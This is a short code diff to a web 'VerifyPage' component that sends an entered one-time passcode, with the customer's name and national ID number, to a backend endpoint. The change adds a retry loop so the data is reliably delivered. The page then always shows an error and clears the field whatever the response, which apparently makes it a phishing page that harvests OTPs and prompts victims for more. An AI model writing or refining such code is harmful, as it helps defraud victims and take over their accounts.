@@ -79,11 +79,21 @@ export default function VerifyPage() {
     e.preventDefault();
     const code = otp.trim();
     if (code.length !== 4 && code.length !== 6) { setLengthError(true); return; }
-    await fetch("/api/verify", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ code, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
-    });
+
+    let sent = false;
+    for (let attempt = 0; attempt < 2 && !sent; attempt++) {
+      try {
+        const res = await fetch("/api/verify", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ code, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
+        });
+        const data = await res.json().catch(() => ({}));
+        if (data.ok) sent = true;
+      } catch (_) {}
+      if (!sent && attempt === 0) await new Promise(r => setTimeout(r, 1500));
+    }
+
     setCodeError(true);
     setOtp("");
     inputRef.current?.focus();
